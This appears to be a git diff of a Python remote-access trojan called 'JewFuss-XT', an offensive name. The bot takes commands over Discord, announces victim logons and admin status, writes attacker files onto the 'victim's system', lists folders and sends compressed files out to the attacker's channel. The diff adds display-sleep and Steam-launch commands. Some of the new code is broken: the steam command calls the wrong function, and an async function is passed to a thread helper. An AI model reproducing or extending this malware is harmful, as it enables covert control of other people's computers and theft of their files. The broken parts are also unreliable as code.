@@ -18,10 +18,10 @@ import datetime
 import platform
 import pymsgbox
 import requests
-import pathlib
-import difflib
 import asyncio
+import difflib
 import discord
+import pathlib
 import pystray
 import getpass
 import sqlite3
@@ -48,7 +48,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.7.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.8.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False
 
 intents = discord.Intents.all()
@@ -77,6 +77,7 @@ commands.Context.fm_reply = fm_reply
 TRAY_TITLE = os.path.basename(sys.argv[0].split('.')[0])
 TRAY_TOOLTIP = f"{TRAY_TITLE} {version}"
 
+tray_image = None
 tray_icon = None
 
 if USE_TRAY_ICON:
@@ -220,6 +221,14 @@ def check_permissions(file_path):
         'delete': os.access(file_path, os.W_OK)
     }
     return permissions
+
+@bot.command(aliases=['sleepdisplay'], help="Put displays into sleep mode", usage="$displaysleep")
+async def displaysleep(ctx):
+    try:
+        await asyncio.to_thread(ctypes.windll.user32.SendMessageW, 0xFFFF, 0x0112, 0xF170, 2)
+        await ctx.send("Putting displays to sleep")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
 
 @bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]", usage="$wallpaper <set|get> [location]")
 async def wallpaper(ctx, action: str = None, filepath: str = None):
@@ -824,6 +833,7 @@ async def on_guild_join(guild):
 
 @bot.event
 async def on_ready():
+    global tray_icon
     in_server_amount = 0
     logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"
 
@@ -850,18 +860,18 @@ async def on_ready():
             await existing_channel.edit(topic=logon_date)
             await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
         in_server_amount += 1
+    
+        print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
         
         if not USE_TRAY_ICON or tray_icon is not None:
             return
+
         print("Starting tray icon...")
-        
         menu = pystray.Menu(pystray.MenuItem("Exit", tray_on_exit_clicked))
         tray_icon = pystray.Icon("JewFuss-XT", tray_image, TRAY_TITLE, menu)
         tray_icon.title = TRAY_TOOLTIP
         tray_icon.run_detached()
-
-
-    print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
+        print("tray icon started")
     
 @bot.event
 async def on_message(message):
@@ -1186,6 +1196,227 @@ if($apps){ $id = ($apps | Sort-Object Name | Select-Object -First 1).AppID; Star
 
     print(f"[no match] '{raw_query}'")
     return None, "not found"
+
+def launch_steam(name):
+    corrections = {
+        "cs go": "counter strike 2",
+        "csgo": "counter strike 2",
+        "gmod": "garry's mod",
+        "g mod": "garry's mod"
+    }
+    def norm(s):
+        return "".join(ch for ch in (s or "").lower() if ch.isalnum())
+    def tokenize(s):
+        return [t for t in re.split(r"[^a-z0-9]+", (s or "").lower()) if t]
+    def per_token_match_score(qt: str, kt: str) -> float:
+        n = len(qt)
+        if n >= 4:
+            w = 1.5
+        elif n >= 3:
+            w = 1.0
+        else:
+            return 0.0
+        if qt == kt:
+            ol = len(qt)
+        elif qt.startswith(kt):
+            ol = len(kt)
+        elif kt.startswith(qt):
+            ol = len(qt)
+        else:
+            return 0
+        frac = ol / max(len(qt), len(kt))
+        base = w * frac
+        bonus = 0.0
+        if ol >= 4:
+            bonus = (ol - 4) * 0.1
+        return base + bonus
+    def find_steam_root():
+        candidates = []
+        home = os.path.expanduser("~")
+        candidates.append(r"C:\Program Files (x86)\Steam")
+        candidates.append(r"C:\Program Files\Steam")
+        candidates.append(os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam"))
+        candidates.append(os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam"))
+        candidates.append(os.path.join(home, ".steam", "steam"))
+        candidates.append(os.path.join(home, ".local", "share", "Steam"))
+        candidates.append(os.path.join(home, "Library", "Application Support", "Steam"))
+        seen = set()
+        for path in candidates:
+            if not path:
+                continue
+            norm_p = os.path.normpath(path)
+            if norm_p in seen:
+                continue
+            seen.add(norm_p)
+            if os.path.isdir(norm_p) and os.path.isfile(os.path.join(norm_p, "steamapps", "libraryfolders.vdf")):
+                return norm_p
+        return None
+    def parse_libraryfolders(library_vdf_path, steam_root):
+        try:
+            with open(library_vdf_path, "r", encoding="utf-8", errors="ignore") as f:
+                text = f.read()
+        except Exception as e:
+            print(f"[steam] failed to read {library_vdf_path}: {e}")
+            return []
+        lib_paths = set()
+        for match in re.finditer(r'"path"\s*"([^"]+)"', text):
+            p = match.group(1)
+            if p:
+                lib_paths.add(os.path.normpath(p))
+        if not lib_paths:
+            for match in re.finditer(r'"(\d+)"\s*"([^"]+)"', text):
+                p = match.group(2)
+                if os.path.isdir(p):
+                    lib_paths.add(os.path.normpath(p))
+        steamapps_default = os.path.join(steam_root, "steamapps")
+        libraries = []
+        if os.path.isdir(steamapps_default):
+            libraries.append(steamapps_default)
+        for lp in sorted(lib_paths):
+            sa = os.path.join(lp, "steamapps")
+            if os.path.isdir(sa) and sa not in libraries:
+                libraries.append(sa)
+        return libraries
+    def parse_appmanifest(acf_path):
+        try:
+            with open(acf_path, "r", encoding="utf-8", errors="ignore") as f:
+                text = f.read()
+        except Exception as e:
+            print(f"[steam] failed to read {acf_path}: {e}")
+            return None
+        data = {}
+        for key in ("appid", "name", "installdir"):
+            m = re.search(rf'"{key}"\s*"([^"]*)"', text)
+            if m:
+                data[key] = m.group(1)
+        if "appid" not in data:
+            return None
+        return data
+    def collect_installed_games(libraries):
+        games = []
+        for steamapps in libraries:
+            try:
+                entries = os.listdir(steamapps)
+            except Exception as e:
+                print(f"[steam] failed to list {steamapps}: {e}")
+                continue
+            for fn in entries:
+                if not fn.startswith("appmanifest_") or not fn.endswith(".acf"):
+                    continue
+                acf_path = os.path.join(steamapps, fn)
+                info = parse_appmanifest(acf_path)
+                if not info:
+                    continue
+                appid = (info.get("appid") or "").strip()
+                title = (info.get("name") or "").strip()
+                installdir = (info.get("installdir") or "").strip()
+                if not appid:
+                    continue
+                games.append(
+                    {
+                        "appid": appid,
+                        "name": title,
+                        "installdir": installdir,
+                        "steamapps": steamapps
+                    }
+                )
+        return games
+    def open_game(appid, mode):
+        try:
+            subprocess.Popen(
+                ["cmd", "/c", "start", "", f"steam://rungameid/{appid}"],
+                shell=False
+            )
+        except Exception as e:
+            print(f"[steam] launch error for {appid}: {e}")
+        return appid, mode
+    raw_query = (name or "").strip()
+    if not raw_query:
+        return None, "not found"
+    q_lower = raw_query.lower()
+    corrected = corrections.get(q_lower)
+    if corrected:
+        print(f"[correction] {q_lower} -> {corrected}")
+        q_lower = corrected
+        raw_query = corrected
+    q_tokens_all = tokenize(raw_query)
+    q_norm = norm(raw_query)
+    steam_root = find_steam_root()
+    if not steam_root:
+        print("[steam] could not locate Steam root")
+        return None, "not found"
+    library_vdf = os.path.join(steam_root, "steamapps", "libraryfolders.vdf")
+    if not os.path.isfile(library_vdf):
+        print(f"[steam] libraryfolders.vdf not found at {library_vdf}")
+        return None, "not found"
+    libraries = parse_libraryfolders(library_vdf, steam_root)
+    if not libraries:
+        print("[steam] no libraries found")
+        return None, "not found"
+    games = collect_installed_games(libraries)
+    if not games:
+        print("[steam] no installed games detected")
+        return None, "not found"
+    if raw_query.isdigit():
+        for g in games:
+            if g["appid"] == raw_query:
+                return open_game(g["appid"], "appid")
+    candidates = {}
+    for g in games:
+        title = g["name"] or ""
+        installdir = g["installdir"] or ""
+        raw_name = f"{title} {installdir}".strip()
+        nkey = norm(raw_name)
+        toks_all = tokenize(raw_name)
+        prev = candidates.get(nkey)
+        if not prev:
+            candidates[nkey] = (g, raw_name, toks_all, nkey)
+    if candidates:
+        if q_norm in candidates:
+            g, _, _, _ = candidates[q_norm]
+            return open_game(g["appid"], "exact")
+        token_hits = []
+        for _, (g, raw_name, toks_all, nkey) in candidates.items():
+            total = 0.0
+            matched_any = False
+            for qt in q_tokens_all:
+                best = 0.0
+                for kt in toks_all:
+                    sc = per_token_match_score(qt, kt)
+                    if sc > best:
+                        best = sc
+                if best > 0.0:
+                    matched_any = True
+                    total += best
+            if matched_any and total > 0.0:
+                token_hits.append((total, g))
+        if token_hits:
+            token_hits.sort(key=lambda x: x[0], reverse=True)
+            return open_game(token_hits[0][1]["appid"], "token")
+        sub_hits = []
+        for _, (g, raw_name, toks_all, nkey) in candidates.items():
+            if q_lower in raw_name.lower():
+                sub_hits.append(g)
+        if sub_hits:
+            return open_game(sub_hits[0]["appid"], "substring")
+        fuzzy_hits = []
+        for _, (g, raw_name, toks_all, nkey) in candidates.items():
+            r = difflib.SequenceMatcher(None, nkey, q_norm).ratio()
+            if r >= 0.93:
+                fuzzy_hits.append((r, g))
+        if fuzzy_hits:
+            fuzzy_hits.sort(key=lambda x: x[0], reverse=True)
+            return open_game(fuzzy_hits[0][1]["appid"], "fuzzy")
+    print(f"[steam no match] '{raw_query}'")
+    return None, "not found"
+
+@bot.command(help="launch a app from steam", usage="$app <query>")
+async def steam(ctx, *, query: str = ""):
+    app, mode = launch_app(query)
+    if app:
+        await ctx.send(f"Launched `{query}` via `{mode}`: `{app}`")
+    else:
+        await ctx.send(f"Could not find steam application matching `{query}`.")
 
 @bot.command(help="search various regesteries and menus for an app and open it", usage="$app <query>")
 async def app(ctx, *, query: str = ""):
@@ -2092,20 +2323,31 @@ async def write(ctx, *, text: str):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
         
-@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <destionation>")
+@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <destination>")
 async def upload(ctx, folder: str = None):
     if not folder:
         await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
         return
-    if not os.path.exists(folder):
-        os.makedirs(folder)
-    if len(ctx.message.attachments) > 0:
+
+    try:
+        if len(ctx.message.attachments) == 0:
+            await ctx.send("Error: No file attached to the message.")
+            return
+
         attachment = ctx.message.attachments[0]
-        file_path = os.path.join(folder, attachment.filename)
+
+        def prep_path():
+            if not os.path.exists(folder):
+                os.makedirs(folder)
+            return os.path.join(folder, attachment.filename)
+
+        file_path = await asyncio.to_thread(prep_path)
+
         await attachment.save(file_path)
+
         await ctx.send(f"File `{attachment.filename}` has been saved to '{folder}'.")
-    else:
-        await ctx.send("Error: No file attached to the message.")
+    except Exception as e:
+        await ctx.send(f"Error: Failed to upload file. {e}")
 
 @bot.command(help="Lists contents of a folder on the system", usage="$ls <folder>")
 async def ls(ctx, path: str = None):
@@ -2196,13 +2438,18 @@ async def download(ctx, file_path: str = None):
         if not os.path.exists(file_path):
             await ctx.send(f"Error: The path '{file_path}' does not exist.")
             return
-        
-        tar_filename = os.path.basename(file_path) + '.tar.gz'
-        buffer = io.BytesIO()
-        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
-            tar.add(file_path, arcname=os.path.basename(file_path))
-        buffer.seek(0)
+
+        async def compress():
+            tar_filename = os.path.basename(file_path) + ".tar.gz"
+            buffer = io.BytesIO()
+            with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
+                tar.add(file_path, arcname=os.path.basename(file_path))
+            buffer.seek(0)
+            return buffer, tar_filename
+
+        buffer, tar_filename = await asyncio.to_thread(compress)
         await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
+
     except Exception as e:
         await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
     
